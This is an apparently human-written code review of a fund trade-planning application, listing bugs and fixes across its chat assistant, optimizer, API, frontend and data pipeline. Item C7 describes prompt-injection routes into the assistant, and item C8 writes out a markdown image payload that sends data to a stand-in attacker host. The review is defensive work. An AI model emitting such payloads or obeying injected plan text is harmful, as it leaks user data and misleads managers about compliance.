# PIC Code Review: Identified Issues and Fixes

Scope: chat assistant, planner/optimizer/policy, backend API and database, frontend, and the data and prediction pipeline.

Status: **read-only review.** Findings come from reading the code against the docs in this folder. Nothing was run, and the existing tests could not be run because `pytest` is not installed in the review environment. Each item should be confirmed before it is changed.

Severity: **High** (wrong results, data loss, or blocks the core workflow), **Medium** (incorrect or fragile behavior in some conditions), **Low** (minor or latent).

## Suggested fix order

| Priority | Issue | IDs |
|---|---|---|
| 1 | Funded buy plans are always BLOCKED and the optimizer falls back to rules | P1, P2 |
| 2 | Decision flow has no gate, overwrites history, and can report false success | B2, B3, B4, F2 |
| 3 | Wrong AUM used in post-trade weight checks | P3 |
| 4 | Rules and manual paths ignore restrictions, plus the price-division crash | P4, P5 |
| 5 | Chat fails after one long reply | F4 |
| 6 | Legacy `predictions.json` fallback leaves most holdings without predictions | D1 |
| 7 | Wrong fund shown, unknown `fund_id` accepted, `/api/fund/save` double-counts | F1, B5, B6 |

Auth and CORS (B1) depends on how the app is deployed and needs a decision before it is changed. The possible look-ahead in the TFT features (D2) needs a check of the dataset build before any change.

---

## 1. Chat assistant

### C1. Memory window is only 10 messages (Medium)
- Where: `frontend/src/components/PlannerAssistant.jsx` (history `.slice(-10)`), `backend/app/schemas.py` (`history` `max_length=10`), `backend/app/assistant.py` (`history[-10:]`).
- Problem: older requests silently drop out of context in a long session.
- Fix: raise the cap to about 20 in all three places, or summarize older turns.

### C2. Suggestions are not sanitized (Low)
- Where: `backend/app/assistant.py` (`_extract_suggestions`, `interpret_intent`).
- Problem: only the type and count are checked. The prompt asks for suggestions that do not repeat the user's last message, but nothing enforces it. There is also no length cap and no check against the available funds or sectors.
- Fix: drop suggestions that are empty, over about 120 characters, or equal to the user's last message.

### C3. Intent path fails entirely if suggestions are malformed (Medium)
- Where: `backend/app/assistant.py` (`IntentInterpretation.suggested_prompts`, `responses.parse`).
- Problem: `suggested_prompts` is part of the required structured schema. If it fails validation, the whole call raises `AssistantGenerationError` and the user gets an error instead of a reply. Plan chat degrades to no suggestions instead.
- Fix: make suggestions best-effort, for example by requesting them separately, or by parsing leniently and dropping them on failure.

### C4. Long reply or message breaks every later chat turn (High)
- Where: `PlannerAssistant.jsx` (history built from full content), `schemas.py` (`AssistantChatMessage` and request caps).
- Problem: the backend caps each history item and the message at 3000 characters. A long markdown reply or a pasted message makes every following request return 422 until the chat is cleared. The error is shown as raw pydantic JSON.
- Fix: truncate each history item to about 2900 characters before sending, cap the input at 3000 (4000 for the interpret route), and parse `detail` from error responses (see F12).

### C5. Archived sessions (Low)
- Where: `PlannerAssistant.jsx` (`openPastSession`, `archiveCurrentSession`, `saveArchive`).
- Problems:
  - Opening a past session archives the current chat but does not remove the opened one, so cycles create duplicates that push real sessions out of the 20-session cap.
  - `saveArchive` is called inside a `setState` updater, which is a side effect in a function that should be pure.
  - Two tabs overwrite each other's archive, because state is read once at mount.
- Fix: remove the opened session from the archive when reopening, move the save out of the updater, and re-read storage before writing.

### C6. Reopened sessions mix old chat with current form state (Low)
- Problem: restored messages describe an older form, but `draft` is today's, which can confuse "same as before" follow-ups.
- Fix: leave unless it shows up in practice.

### C7. Assistant prompt-injection surface is only partly hardened (Low)
- Where: `backend/app/assistant.py`, `schemas.py:122`.
- Problems: `draft` is untyped and unbounded. Client-supplied `history` items with `role="assistant"` are replayed as genuine assistant turns. Plan text (notes, comments, order reasons) is returned from tools as trusted output.
- Impact is limited because the tools are read-only and updates are validated against allow-lists. The remaining risk is a misleading reply, such as saying a plan is compliant.
- Fix: type and size-limit `draft`, drop or restrict client-supplied assistant-role history, wrap tool content in delimiters, and make the model cite the authoritative `policy_status` when summarizing compliance.

### C8. Chat images (Low)
- Where: `PlannerAssistant.jsx` (markdown rendering).
- Problem: a prompt-injected reply can include `![](https://evil/?q=...)`, which the browser fetches automatically.
- Fix: pass `disallowedElements={['img']}` and give links `rel="noopener noreferrer"`.

---

## 2. Planner, optimizer, policy

### P1. Funded buy plans are always BLOCKED by `CASH-DEPLOYMENT` (High)
- Where: `backend/app/planner.py:709-714`, `backend/app/policy.py:429-437`.
- Problem: funding sells are sized to `gap = buy_total - investable`, but the check allows only `investable * 0.95` of net deployment. After the sells, net buy is at or above the investable amount, so the check returns BLOCK. Sells floored to whole shares make it worse.
- Example: 100 Cr investable and a 150 Cr buy. The sells raise about 50 Cr, net buy is about 100 Cr, and the limit is 95 Cr.
- Impact: contradicts the rule that large plans must stay executable.
- Fix: size the gap against the usable ceiling, `gap = buy_total - (operational * max_cash_usage_ratio + subscription)`, in both the rules and optimizer paths. Alternatively exempt funding-sell-covered plans from the BLOCK.

### P2. Optimizer cannot size a buy above 95% of investable cash (High)
- Where: `planner.py:1055-1085`, `optimizer.py:236-240`, `optimizer.py:259-279`.
- Problem: `max_total_amount = 0.95 * investable` is passed, while the optimizer also requires `sum(buy) == amount`. When `amount` exceeds the cap, every relaxation tier is infeasible and `OptimizationFailed` is raised. The caller shows a misleading "Convex optimization failed" warning and falls back to rules, which then hits P1. The funding-sell branch at `planner.py:1080-1085` is effectively dead code.
- Fix: for `increase/buy/add`, do not pass `max_total_amount` (or pass `amount`) and let the funding sells cover the gap. Fix together with P1.

### P3. Post-trade AUM denominator is wrong for cash-funded buys (High)
- Where: `planner.py:603-608`, `policy.py:205-207`.
- Problem: `post_aum = aum + net_flow` treats every net buy as new AUM. Only a contribution adds AUM and only a redemption removes it.
- Example: AUM 1000, sector at 330, buy 50 more. True weight is 38.0%; the code gives 380/1050 = 36.2%. A FAIL can become a WARN, or a WARN a PASS.
- Affects: issuer, sector and group checks, plus the UCITS 5/40 and country checks.
- Fix: `post_aum = aum + (amount if contribution) - (sells if redemption)`, and pass the action into the check.

### P4. Rules and manual paths ignore restrictions (High)
- Where: `build_redemption` (`planner.py:522-547`), `_funding_sells` (`448-474`), the rules sector-sell (`719-736`), the `build_rebalance` sell branch (`575-577`), manual SELL (`773-783`).
- Problem: none call `policy.trade_block_reason`, and the sell paths never subtract `minimum_holding_shares`. Manual SELL also ignores pending sells and reads `holding["sellable_shares"]` directly. Orders are produced that `policy._order_checks` then blocks with `RESTRICTED-SECURITY`, `MIN-HOLDING` or `RESTRICTED-SELL`.
- Affects: every `method="rules"` plan and every optimizer fallback.
- Fix: add one shared helper that skips a holding when `trade_block_reason` is set and caps shares at `min(_available_sellable_shares, held - minimum_holding_shares)`. Use it in all these paths.

### P5. Unguarded price division can crash with a 500 (High)
- Where: `planner.py:730-732`, `planner.py:778`.
- Problem: `// h["price"]` with a price of 0 or `None` raises `ZeroDivisionError` or `TypeError`. The rules path is also the optimizer's fallback, so nothing catches it. Other builders guard this (`540`, `565`).
- Fix: apply `_usable_price` and skip the holding.

### P6. Trade-date scheduler calendar call is unguarded (Medium)
- Where: `planner.py:195-207`, `planner.py:1446`.
- Problems: `mcal.get_calendar(...).valid_days` has no try/except, so a calendar or library error aborts the whole plan, against the "warnings only, never block" rule. If the window has no sessions (for example a Saturday trade date with Monday settlement), a warning is returned but no `trade_date` is set, while `final-date-rules.md` section 9 says orders keep `trade_date = trade_date`.
- Fix: wrap the calendar call in try/except and return a warning. In the empty-window case set `order["trade_date"] = trade_date.isoformat()`.

### P7. Every order gets the plan-level settlement date (Medium)
- Where: `planner.py:1451-1455`, `planner.py:362-377`.
- Problem: the intent's `settlement_date` is stamped on every order while the scheduler spreads orders across the window. An order scheduled on Monday with plan settlement on Thursday is recorded as T+3, against date-rules section 7. `cycle` is written as `T+{calendar_days}`, so a Friday trade settling Monday shows as T+3.
- Fix: set each order's settlement to the next NSE/BSE session after its own `trade_date`, and count sessions rather than calendar days for `cycle`.

### P8. Cross-plan committed load counts the wrong plans (Medium)
- Where: `planner.py:171-181`.
- Problem: only "Rejected" plans are skipped, but `final-date-rules.md` section 4 counts only "Approved — sent to Trading" plans with at least one sent email. Pending, escalated and returned plans inflate other days' load. It also uses the universe `adv_cr` only, not `min(adv, median_adv)` as `_schedule_order_trade_dates` does.
- Fix: reuse `_approved_sent_plans(None)` or equivalent logic across funds, and use the effective ADV.

### P9. Horizon mixes calendar and trading days (Medium)
- Where: `planner.py:1322-1324`, `planner.py:399-401`, `planner.py:669`, `policy.py:367`, `policy.py:416`, `data_v2.py` (`TODAY`).
- Problems:
  - Horizon is calendar days from trade to settlement but is used as if it were trading days counted from today.
  - Example: trading in 10 days with T+1 settlement gives a horizon of 1, so 10 days of expense accrual and dividends are ignored.
  - `policy.py:367` divides order ADV% by calendar days. Friday to Monday is 3 days but 1 session, so daily participation is understated 3x.
  - Timing flags compare business-day `days_out` from today against calendar-day horizons.
  - `data_v2.TODAY = date.today()` is frozen at import time.
- Fix: derive session counts from the calendar, measure events and cash offsets relative to the trade date, and compute `TODAY` per request.

### P10. Contribution and redemption silently under-deploy or under-raise (Medium)
- Where: `build_contribution` (`planner.py:497-507`), `build_redemption` (`531-550`).
- Problem: allocations under 0.5 Cr are dropped. A 20 Cr contribution with no shortfall, spread over 50 names, gives about 0.4 Cr each and produces zero orders. Lock-in caps and rounding leftovers are not redistributed. Only redemption warns about a shortfall (`1514`). A contribution gives no warning that cash is left undeployed.
- Fix: iteratively redistribute dropped or capped amounts to names with capacity, and add an "N Cr undeployed" warning for contributions.

### P11. Manual sector selections can get the wrong side (Medium)
- Where: `planner.py:1394`, `planner.py:1405`.
- Problem: `manual_side = "BUY" if action == "increase" else "SELL"`, so `buy`, `add` or `contribution` create SELL orders. Default selections are built only for `increase` and `decrease`, not `buy`, `sell`, `trim` or `add`. `manual_selections.extend` also mutates the caller's list.
- Fix: derive the side from an action-to-side map, and copy the list before extending it.

### P12. `held_due_to_tax` and `TAX-HOLD` can mislabel holdings (Low)
- Where: `planner.py:1205-1223`.
- Problem: every negative-forecast, unsold holding whose exit cost exceeds the expected loss is flagged, without checking why it was not sold. Unsellable holdings (locked, restricted, minimum holding, pending sells) are reported as "kept because exit cost exceeds expected loss". On the rules and manual paths tax never influenced selection, yet the same message appears.
- Fix: emit it only when `method_used == "optimize"` and the holding was a sell candidate with `max_sell > 0`.

---

## 3. Backend API and database

### B1. No authentication, wildcard CORS, destructive admin route (High)
- Where: `backend/app/main.py:41-44`, `main.py:87-103`.
- Problem: `POST /api/admin/reset-db` wipes all plans, decisions and sent emails, and clears `_PLANS`. CORS is `allow_origins=["*"]` with all methods and headers, so any web page open in a PM's browser can call it. The same applies to `/api/model/switch` and `/api/fund/save`. The 500 response returns the last 2000 characters of stderr, and the success response returns the DB path.
- Fix: add an auth dependency with an approver role (API key or OIDC), gate the admin route behind an env flag such as `PIC_ENABLE_ADMIN`, restrict CORS to the real frontend origin, and return a generic error while logging stderr server-side.
- Needs a decision: depends on how the app is deployed.

### B2. A decision can be recorded on any plan, any number of times, with no gate (High)
- Where: `main.py:457-481`.
- Problem: `decide_trade_plan` does not check `execution_allowed`, `policy_status`, the current plan status, or whether a decision already exists. A plan with a FAIL or BLOCK result can be approved with one POST, and a Rejected or Escalated plan can be flipped to Approved. `reviewer` is a free optional string, so the audit trail can be spoofed.
- Fix: return 409 unless the status is "Pending PIC Review", return 409 on Approve when `execution_allowed` is false unless an explicit logged override exists, and take the reviewer from the authenticated identity.

### B3. Re-deciding a plan deletes its audit history and sent emails (High)
- Where: `backend/app/db.py:216-224` (`save_plan`), called from `main.py:478`; `db.py:45`; `init_db.py:451`; `db.py:338`.
- Problem: `save_plan` runs `DELETE FROM plans` and `connect()` enables `PRAGMA foreign_keys=ON`. `plan_decisions` and `sent_emails` are `ON DELETE CASCADE`, so a second decision erases every earlier decision and all sent emails. The plan then drops out of `_approved_sent_plans` (`planner.py:263`), so a committed trade stops reducing cash and sellable shares for later plans.
- Fix: use an upsert (`INSERT ... ON CONFLICT DO UPDATE`) or `UPDATE`, never delete and reinsert the parent row. Combine with the state-transition guard in B2.

### B4. Decision success is reported when nothing was persisted (High)
- Where: `main.py:478-480`, `db.py:207-289`, `db.py:413-441`.
- Problem: the return values of `save_plan` and `save_decision` are ignored, and both swallow `sqlite3.Error` and return False. If the DB is locked or missing, the API still returns 200 "Approved — sent to Trading", and the in-memory copy is lost on restart. The two writes are also separate transactions, so a crash between them leaves inconsistent state.
- Fix: do both writes in one transaction, return 503 if either fails, and log the exception.

### B5. `POST /api/fund/save` persists the augmented dataset and double-counts approved trades (Medium)
- Where: `main.py:121-127`, `_ds` at `main.py:54-66`.
- Problem: `_ds()` appends orders from approved plans to `pending_trades`, and `save_fund` writes that augmented dict into `funds.dataset_json`. The next read appends them again. Duplicates compound on each save, pending sells and cash impact are overstated, and `_available_sellable_shares` goes wrong. The endpoint is also unauthenticated and can overwrite fund data.
- Fix: save the raw `data_v2.get_ds(...)`, not the augmented copy. Require auth, and ideally remove or restrict the endpoint.

### B6. Unknown `fund_id` silently falls back to the default fund (Medium)
- Where: `backend/app/data_v2.py:643-651`, `data.py:353-354`.
- Problem: a typo or stale `fund_id` generates a plan on HDFC-FLEXICAP and returns the wrong fund's holdings without an error. History filters by `fund_id`, which hides the plan from the intended fund.
- Fix: raise a 404 for an unknown, non-empty `fund_id`. Default only when `fund_id` is None.

### B7. Unbounded in-memory plan store and a blocking generator in an async endpoint (Medium)
- Where: `main.py:46`, `main.py:286`, `main.py:298-324`.
- Problem: every `POST /api/trade-plan` or `/stream` adds a full plan dict to `_PLANS` with no eviction, and undecided plans are never written to the DB, so memory grows without bound and a restart loses them. `planner.iter_plan_steps` is a synchronous, CPU-bound generator (the CVXPY optimizer) iterated directly in an `async def`, so one stream stalls the whole server including health checks.
- Fix: use a bounded TTL cache or persist pending plans, run the generator via `await asyncio.to_thread(next, it)` or `run_in_threadpool`, and add rate limits.

### B8. Exception text leaks to clients in the SSE stream (Low)
- Where: `main.py:321-322`.
- Problem: `str(exc)` from any internal failure goes straight into the `error` event.
- Fix: log the exception server-side and send a generic message with a correlation id.

### B9. Request validation gaps (Medium)
- Where: `schemas.py:31-59`, `94-97`, `139-142`.
- Problems:
  - `fund_id`, `target`, `targets` and `manual_selections[].ticker` and `.sector` are not checked against known values.
  - `amount_cr` has `ge=0` but no upper bound, so `inf` passes.
  - Dates can be in the past or years away.
  - `DecisionRequest.reviewer` and `comment`, `SendEmailRequest.subject` and `body`, and `note` have no `max_length`.
  - `SendEmailRequest.body` and `subject` are accepted from the client and not tied to the generated draft, so arbitrary content is recorded as "sent".
- Fix: add `max_length`, `le` and `allow_inf_nan=False`, validate ids against the datasets, reject past trade dates, and verify that `subject` and `body` come from the draft for that plan.

### B10. Stale import-time fund snapshot (Medium)
- Where: `data_v2.py:606-623`, `main.py:197`, `main.py:366-374`.
- Problem: `FUNDS_V2` is built once at import (and may run the heavy XLSX/CSV build if the DB is empty), then goes stale after a reseed or reset. `main.py:197` uses it to pick the compliance module. This conflicts with the "reload from DB every request" design. `list_funds` and `interpret_trade_intent` also parse every fund's full JSON on each request.
- Fix: drop the module-level snapshot and read lazily. Use a light query for the funds list.

### B11. SQLite connections never closed, model switch has no lock (Medium)
- Where: `db.py:41-46`, `forecast.py:72-111`, `main.py:80-84`.
- Problem: `with sqlite3.connect(...)` only commits or rolls back and does not close, so each request leaks a connection until garbage collection, which can lead to "database is locked". Reads bypass `_LOCK`, and no timeout or WAL is set. `/api/model/switch` mutates the global `_PREDICTIONS` and `_CURRENT_VERSION` with no lock, and an unknown version falls back to latest while the response says "success".
- Fix: use `contextlib.closing` or a `connect()` context manager that closes, set `timeout=` and WAL mode, lock the model swap, and return 400 for an unknown version.

---

## 4. Frontend

### F1. Plan from a fund you have left can appear under the new fund (High)
- Where: `TradePlanner.jsx:466-476`, `TradePlanner.jsx:542-593`, `App.jsx` (fund `Select`).
- Problem: the fund-change effect clears the plan and fires three fetches with no cancellation, and `generate()` ends with `setPlan(generatedPlan)` regardless of a fund change. Switching funds mid-generation, or during the 2.5 s hold after the stream, shows fund A's plan under fund B. The `sectorExposure`, `universe` and `holdings` responses can also arrive out of order.
- Fix: capture `fundId` at the start of `generate()` and drop the result if it differs, pass an `AbortController` signal to `createTradePlanStream` and abort it in the fund effect, add an `active` flag to each fetch, and disable the fund selector while `busy`.

### F2. Approve, Reject and Escalate can be double-submitted (High)
- Where: `TradePlanner.jsx:599-604`, `TradePlanner.jsx:1131-1133`.
- Problem: `decide()` has no in-flight state and the buttons are never disabled. Clicking two buttons quickly writes two audit rows, and the last request to land becomes the plan status. A failed decision is reported in the generic banner at line 886, which says "is the backend running on :8000?" and shows far from the buttons.
- Fix: add a `deciding` state, disable the buttons while it is set, show errors beside the buttons, and make the backend return 409 for an already-decided plan (see B2).

### F3. Clearing a date field skips validation (Medium)
- Where: `TradePlanner.jsx:70-72`, `TradePlanner.jsx:543-548`.
- Problem: `daysBetween('', x)` returns `NaN`, and `NaN < 1 || NaN > 33` is false, so the check passes. The payload then carries `horizon_days: null` and `trade_date: ""`, and the backend rejects it with a raw 422 dump. `assistantDraft.horizon_days` is also `NaN`.
- Fix: `if (!Number.isFinite(horizon) || horizon < 1 || horizon > MAX)` and require non-empty `tradeDate` and `settlementDate`.

### F4. Plan update collapses the expanded plan in Plan History (Medium)
- Where: `PlanHistory.jsx:309-317`.
- Problem: the effect depends on `[focusPlanId, loading, plans]`, and `decide()` and `sendEmailDraft()` both call `setPlans`. The effect calls `setExpandedPlanId(focusPlanId)`, which is `''` when there is no focus, so approving a plan collapses it and hides the Draft Email button. With a focused plan it also re-runs `scrollIntoView` after every action.
- Fix: split into two effects. One resets expansion only when `focusPlanId` changes. The other scrolls once when loading finishes for that focus id.

### F5. Email send and history errors are invisible (Medium)
- Where: `PlanHistory.jsx:374-400`, `PlanHistory.jsx:423`.
- Problem: failures call `setActionError`, but the `Alert` renders in the page list behind the modal. A failed send shows nothing in the dialog, and if `plans` is empty or `loadError` is set the alert does not render at all.
- Fix: keep a separate `dialogError` and render it inside `DialogContent`.

### F6. Failed fund-list load leaves the app blank (Medium)
- Where: `App.jsx:33-38`, `App.jsx:137`.
- Problem: `.catch(() => {})` leaves `fundId` as `''`, and the body is gated on `{fundId && ...}`. With the backend down the user sees only the header and footer, with no message and no retry.
- Fix: store an error and render an `Alert` with a retry button.

### F7. Hidden manual sector selections are still submitted (Medium)
- Where: `TradePlanner.jsx:415-427`, `TradePlanner.jsx:499-504`, `TradePlanner.jsx:567`.
- Problem: the UI shows only `visibleManualSectorSelections`, but the payload sends the full `manualSectorSelections`. After switching from Increase to Reduce or clicking a preset, the target-validation effect drops sectors from `targets` but not from `manualSectorSelections`, so hidden sectors with old amounts are submitted. `hasExplicitManualAmounts` uses the unfiltered length. `applyPreset` also sets `targets` without creating matching `manualSectorSelections` entries, so selected sectors get no amount input.
- Fix: derive the payload from `visibleManualSectorSelections` and keep `manualSectorSelections` in sync whenever `targets` changes.

### F8. Emptied amount is sent as an empty string or zero (Medium)
- Where: `TradePlanner.jsx:766-770`, `TradePlanner.jsx:827-831`, `TradePlanner.jsx:560-568`.
- Problem: the inputs store `e.target.value` as a string. A cleared manual amount goes out as `amount_cr: ''` and the backend returns a 422. The negative-amount check uses `Number('')`, which is 0, so it passes. A cleared top-level amount becomes `Number('') = 0` and silently submits a zero-amount plan.
- Fix: reject empty or non-finite values in `generate()` and map the manual selections to `Number(amount_cr)` in the payload.

### F9. Generate can be clicked while the assistant is applying updates (Medium)
- Where: `TradePlanner.jsx:506-540`, `TradePlanner.jsx:864`.
- Problem: `applyAssistantUpdates` sets fields one at a time with 230 ms pauses and `busy` is false during that time, so a half-applied form can be submitted.
- Fix: add an `applyingUpdates` state, disable Generate while it is set, and pass it to the assistant as a busy signal.

### F10. Risk/Return panel can show stale data and set the wrong volatility target (Medium)
- Where: `RiskReturnPanel.jsx:65-68`, `RiskReturnPanel.jsx:80-84`.
- Problem: the `riskReturn` fetch has no cancellation, so a slow response from fund A can overwrite fund B's data. The init effect then calls `onChangeTargetVolatility(fundA.strategy_volatility_high)`, which is sent as `target_volatility`. The effect also lists an inline arrow function from the parent as a dependency, so it re-runs on every render.
- Fix: use an `active` flag in the fetch effect and memoize the callback with `useCallback` or drop it from the dependencies.

### F11. `localStorage` read on first render is unguarded (Low)
- Where: `App.jsx:22`, `App.jsx:32`.
- Problem: `getItem` in the `useState` initializer is not in a try/catch, so the app throws on first render when storage access is blocked.
- Fix: wrap in try/catch with a default.

### F12. Raw error text shown to the user (Low)
- Where: `api.js:12`, `api.js:22-25`, `TradePlanner.jsx:886`.
- Problem: error messages are raw response text such as `{"detail":[...]}`, and every error, including 4xx validation errors, gets "is the backend running on :8000?" appended.
- Fix: parse JSON and show `detail`, and show the backend hint only on network failures.

### F13. Missing return value shows as green (Low)
- Where: `TradePlanner.jsx:317`, `TradePlanner.jsx:369`.
- Problem: `null >= 0` is true, so a missing expected return is coloured green next to the "—" placeholder.
- Fix: check for a finite number before choosing the colour.

---

## 5. Data and prediction pipeline

### D1. Legacy `predictions.json` is keyed by series index, not ticker (High)
- Where: `backend/predictions/predictions.json`, `backend/app/forecast.py:98-100`, `backend/app/prediction_generation.py:237-241`.
- Problem: the file has 28 keys that are not tickers (for example "7", "10", "30", "50", "68", "100") and covers 284 symbols against 437 in the data. When `predictions/v2/` is missing, `forecast.py` falls back to it. The numeric keys match no holding, so 181 holdings fall back to the dummy-return path and nothing flags the gap. The newer generator keys by symbol, but silently drops non-finite values (`:239-240`).
- Fix: regenerate predictions keyed by symbol, fail loudly or warn when coverage is below the holdings universe, and log dropped non-finite values.

### D2. Possible look-ahead leakage in the TFT features (needs verification)
- Where: `prediction_generation.py:99-100`, `prediction_generation.py:111`.
- Problem: the target is `monthly_open[t+1]/monthly_open[t]-1`, which is the return during month t. The row-t inputs `monthly_volume`, `oil_price_usd_bbl`, `gold_price_inr_10g` and `cpi_index` look like month-t aggregates, so they may include information from inside the window being predicted. Training and inference share the flaw, so the model would look better than it is. How those columns are built was not confirmed.
- Fix: verify how the columns are aggregated. If they are month-t aggregates, lag them by one month.

### D3. Training cutoff is hardcoded to 2021-08-01 (Medium)
- Where: `prediction_generation.py:117`, `prediction_generation.py:198`.
- Problem: the split date, imputation medians and normalizer depend on it. Retraining on newer data could drift from the saved weights, and `load_state_dict(strict=True)` catches only some mismatches.
- Fix: read the cutoff from the model metadata.

### D4. Adjusted and unadjusted prices can be mixed (Low, latent)
- Where: `backend/scripts/compute_risk_return_metrics.py:176`.
- Problem: `monthly_adj_close.fillna(monthly_close)` would produce a fake jump at the boundary if a stock has adjusted prices for part of its history only. No values are missing in the current CSV.
- Fix: do not mix. Fail or warn when adjusted prices are partially missing.

### D5. Missing months are treated as one period (Medium, active)
- Where: `compute_risk_return_metrics.py:177`, `compute_risk_return_metrics.py:99`.
- Problem: `pct_change` per ISIN and the annualization assume consecutive months. One ISIN in the current CSV has a date gap, so a multi-month return is counted as one month and its return, volatility and 1M/3M/6M figures are wrong.
- Fix: reindex to a complete monthly calendar per ISIN before computing returns, or exclude gap periods.

### D6. Zero or negative price gives infinite returns (Low, latent)
- Where: `compute_risk_return_metrics.py:177`, `:95-99`, `:105`, `:122`.
- Problem: no guard against a zero prior price, which gives `inf`. Volatility and Sortino then return `inf` or NaN. The current data has no bad prices, but a bad refresh would pass through unchecked.
- Fix: validate prices are positive and finite before computing returns.

### D7. Fund metrics apply today's weights to past returns (Medium)
- Where: `compute_risk_return_metrics.py:218-243`.
- Problem: current holdings are applied to history and renormalized over whichever names have data that month, so early windows are dominated by long-lived names. This biases the strategy bands toward survivors, and the bands feed the planner (`risk_model.py`, `planner.py`). The docstring calls the series synthetic, but the stored column names do not carry that caveat.
- Fix: document it in the output column names and the docs, or use point-in-time holdings if available.

### D8. Hardcoded risk-free rate and band percentages (Low)
- Where: `compute_risk_return_metrics.py:64`, `:75`, `:79-85`.
- Problem: the risk-free rate is fixed at 6.5%, the fallback bands at 10-25% by risk grade, and at least 12 rolling windows are required. These can go stale, and the CSV records `strategy_range_source` but not the risk-free rate used.
- Fix: make them configuration values and record the rate used in the output.

### D9. Drawdown and 1M return omit the starting level (Low)
- Where: `compute_risk_return_metrics.py:184`, `:243`, `:275`.
- Problem: dropping the first NaN return makes `level` start at the second observation, and the fund `cumprod` level has no initial 1.0, so max drawdown is slightly understated. A fund's `as_of_date` is the panel maximum rather than that fund's own last observation.
- Fix: prepend the starting level of 1.0 and use each fund's own last date.

---

## 6. Test coverage gaps

- Existing tests: `test_forecast.py` (5), `test_tax.py` (22), `test_policy.py` (8), `test_plan_email_tracking.py` (4), `test_assistant.py` (2), `test_optimizer.py` (1). They could not be run in the review environment because `pytest` is not installed.
- No tests for: `prediction_generation`, the metric math in `compute_risk_return_metrics.py` (Sharpe, Sortino, drawdown, rolling bands, NaN handling), the DB-first versus file fallback in `forecast.load_model` (`:92-104`), `risk_model.py` consumers, the decision endpoint and state transitions, or the large-flow rule (plans for large contributions and redemptions must stay executable).
- `backend/tests/plan_generation_matrix.py` has no test functions.
- Suggested first tests, one per High item: funded buy stays executable (P1, P2), weight checks use the correct AUM (P3), restricted holdings are never sold by the rules path (P4), a second decision does not delete history (B3), a long chat reply does not break the next turn (C4).

## Items not confirmed as problems

- `xlsx_parser.py` only reads fixed local paths (`data_v2.py:129-157`) and there is no upload endpoint, so zip-bomb and path risks do not apply today. If an untrusted file is ever parsed, the stdlib XML parser is exposed to entity-expansion attacks.
- The SQL read during the review is parameterized. The f-string table names in `db.py:51` and `init_db.py:489` come from constants.
- `react-markdown` does not render raw HTML or `javascript:` URLs, so there is no direct XSS in the chat. The image issue (C8) is separate.
